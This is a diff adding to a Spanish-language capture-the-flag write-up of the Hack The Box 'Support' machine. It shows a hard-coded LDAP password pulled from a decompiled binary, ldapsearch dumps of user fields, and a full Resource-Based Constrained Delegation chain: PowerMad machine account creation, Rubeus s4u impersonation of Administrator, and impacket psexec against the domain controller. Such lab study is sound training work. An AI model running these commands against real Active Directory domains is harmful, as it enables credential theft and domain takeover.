@@ -129,3 +129,213 @@ Todos ejecutables se encuentran publicamente, excepto por UserInfo, por lo que n
 
 Ahora podemos ejecutarlo en una maquina virtual de Windows:
 
+![[Screenshot 2026-05-07 091915.png]]
+
+Vemos que tenemos una opción para buscar usuarios y otro para obtener información de un usuario especifico, intentemos probar diferentes opciones a ver que encontramos:
+
+![[Screenshot 2026-05-07 092128.png]]
+
+Nos está pidiendo el parametro `-username`, pero al indicarlo nos sale el siguiente error:
+
+![[Screenshot 2026-05-07 092146.png]]
+
+Esto me hace pensar que se están intentando hacer peticiones al servidor (seguramente del DC) enviando LDAP queries,  por lo que probablemente tengmaos que añadiro support.htb (el nombre de dominio), el archivo `C:\Windows\System32\drivers\etc\hosts`, despues de hacer esto vemos que efectivamente obtenemos la información:
+
+![[Screenshot 2026-05-07 095849.png]]
+
+Esto es una buena señal ya que significa que seguramente las credenciales de LDAP deben estar en el codigo de UserInfo.exe, por lo que lo podemos abrir con DNSpy y despues de rebuscar en donde se enviaba la Query, encontramos este codigo: 
+
+![[cap.png]]
+
+![[Screenshot 2026-05-08 102535.png]]
+
+Basicamente lo que hace este codigo, es, almacenar en enc_password, la contraseña encriptada con la palabra key armando, y en la parte de arriba, es la desencripación que se hace de esa password para enviarla en la Query de ldap, entonces simplemente copie y pegue el codigo en una pagina para ejecutarlo, pero modificando algunas cosas apra que me muestre el resultado de esa desencriptacion:
+
+
+![[Screenshot 2026-05-07 104216.png]]
+
+Esto me da como resultado la contraseña: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
+
+Con estas credenciales lo primero que puedo probar es una recolección de info con bloohound-python:
+
+![[Pasted image 20260508153715.png]]
+
+Analizando no vemos nada interesante para el usuario ldap en bloodhound:
+
+![[Pasted image 20260508154645.png]]
+
+Vemos que no hay Outbound controls saliendo de LDAP@support.htb.
+
+Por lo que tenemos que buscar alternativas para obtener acceso usando estas credenciales, vamos a dumpear toda la base de datos de LDAP para ver informacion importante, los atributos mas interesantes que puede tener cada usuario son info, comment y description, por lo que filtraremos teniendo en cuenta esto:
+
+```bash
+sudo ldapsearch -H ldap://10.129.51.75 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -E "info|description|comment"
+```
+
+![[Pasted image 20260509092857.png]]
+
+Todo normal, excepto por el campo Info, que parece ser una contraseña, entonces vamos a ver a quien le corresponde ese campo:
+
+```shell
+sudo ldapsearch -H ldap://10.129.51.75 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep "info" -C 10 
+```
+
+
+![[Pasted image 20260509093641.png]]
+
+Vemos que le pertenece a support, vamos a confirmarlo con netexec:
+
+![[Pasted image 20260509093952.png]]
+
+Ahora vamos a analizar que privilegios tenemos como support, y encontramos unas cuentas cosas interesantes, lo primero es que hacemos parte de Managment Users, y ademas, al ser parte de SHARED SUPPORT ACCOUNTS, podemos tener permisos GenericAll:
+
+![[Pasted image 20260509095130.png]]
+
+
+Vamos a entrar por evil-winrm a la maquina para explotar un RBCD (Resource-Based Constrained Delegation):
+
+![[Pasted image 20260510182936.png]]
+
+Ahora vamos a subir unas cuantas herramientas que serán necesarias para nuestra escalada de privilegios:
+
+- PowerView.ps1: Enumerar información del dominio
+- Powermad.ps1: Explotar vulnerabilidades de MachineAccountQuota
+- Rubeus.exe: para explotar Kerberos y Creación de tickets
+
+![[Pasted image 20260510195859.png]]
+
+Ahora vamos a instalar los modulos PowerView y Powermad:
+
+![[Pasted image 20260510200815.png]]
+
+Usaremos PowerView para saber la cantidad de maquinas que se pueden crear msDS-AccountMachineQuota 
+
+
+### Revisar MachineAccountQuota (Dentro del DC)
+
+```ruby
+Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota
+```
+
+
+![[Pasted image 20260510143020.png]]
+
+Hay un cupo de 10 maquinas, por lo que ahora podemos pasar al sigueinte paso
+### Revisar el parametro msDS-AllowedAoActABehalfOfOtherIdentity 
+
+Tenemos que ver si esta vacio este atributo, porque dependiendo de eso cambia la forma del ataque:
+
+**Si está vacío:** Puedes escribir directamente sin problema. Es el escenario ideal para el ataque.
+
+**Si ya tiene un valor:** Puedes sobreescribirlo si tienes permisos de escritura sobre el objeto. El atributo acepta ser modificado si tienes los permisos necesarios.
+
+
+Para esto vamos a usar [[PowerView]] un Modulo de Powershell usado para enumerar información del dominio:
+
+```ruby
+. ./PowerView.ps1
+```
+
+Ahora con  `Get-DomainComputer DC` 
+
+```ruby
+Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
+```
+
+## Crear cuenta de maquina
+
+Crearemos la cuenta de maquina usando [[PowerMad]]:
+
+```ruby
+New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
+```
+
+Vamos a comprobar que si se haya creado la cuenta de maquina (Machine Account):
+
+```ruby
+Get-ADComputer -identity FAKE-COMP01
+```
+
+## Setear parametro msDS-AllowedAoActABehalfOfOtherIdentity
+
+Vamos a setear esta cuenta de maquina en el parametro **`msDS-AllowedAoActABehalfOfOtherIdentity`** para que confie en esa maquina falsa, para eso usamos el parametro **``PrincipalsAllowedToDelegateToAccount``** que basicamente traduce la cuenta de maquina en el Security Descriptor, que es lo que finalmente se guarda en **`msDS-AllowedAoActABehalfOfOtherIdentity`**: 
+
+```python
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+```
+
+## Comprobar el parametro msDS-AllowedToActABehalfOfOtherIdentity
+
+Ahora comprobemos que efectivamente el parametro **`msDS-AllowedAoActABehalfOfOtherIdentity`** tenga este valor:
+
+```r
+ 
+```
+
+Vemos que aparece con el nombre de **``PrincipalsAllowedToDelegateToAccount``**, no es que sea un parametro diferente, es que es la traduccion del security descriptor que hay en **`msDS-AllowedToActABehalfOfOtherIdentity`**:
+
+
+![[Pasted image 20260510172521.png]]
+
+
+## Explotación de S4U2Self y S4U2Proxy
+
+Ya que la maquina de cuenta FAKE-COMP01 tiene permiso para hacerse pasar por otros usuarios frente a dc.support.htb, podemos pedir un TGS de Administrator para acceder a el SPN *`cifs/dc.support.htb`*, esto lo podemos hacer desde windows con Rubeus.exe:
+
+Primero tenemos que obtener el hash rc4 de la cuenta de servicio o cuenta de maquina sobre la que tengamos control:
+
+```r
+.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+```
+
+![[Pasted image 20260512082953.png]]
+
+Ya con el hash (resaltado en verde) podemos solicitar el TGS del usuario Administrator para el SPN  **`cifs/dc.support.htb`**:
+
+```r
+rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+```
+
+
+![[Pasted image 20260512082548.png]]
+
+Ahora tenemos que **`convertir el ticket`**, porque está en .kirbi, pero como la idea es usarlo en linux con psexec o wmiexec es fundamental que el formato sea .ccache:
+
+Rubeus nos entregó el ticket en base64, vamos a quitarle los saltos de linea y espacios en blanco para poder desencodearlo dentro de un archivo, para quitar estos espacios en blanco podemos usar [esta](https://www.browserling.com/tools/remove-all-whitespace)pagina.
+
+Con todo metido en el archivo vamos a desencodearlo y mterlo en un archivo:
+
+```r
+base64 -d kerb.b64 > kerb.kirbi
+```
+
+Ahora lo convertimos de .kirbi a .ccache:
+
+```r
+impacket-ticketConverter kerb.kirbi kerb.ccache
+```
+
+Vamos a exportar la ruta del ticket en la variable de entorno KRB5CCNAME para que pueda ser usado por las diferentes herramientas de impacket:
+
+```r
+export KRB5CCNAME=$(pwd)/kerb.ccache
+```
+
+Listo!, ya tenemos el ticket de administrator, vamos a conectarnos al dc usando psexec (psexec usa SMB para conectarse, por eso es que nos sirve para el SPN cifs):
+
+```r
+impacket-psexec 'support.htb/Administrator@dc.support.htb' -no-pass -k
+```
+
+Al ejecutar el comando nos sale el error:
+
+
+***`Error: \[-\] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.`***
+
+Esto lo solucioné sincronizando la hora de mi maquina con la del DC:
+
+```r
+sudo timedatectl set-ntp off
+```
+
+
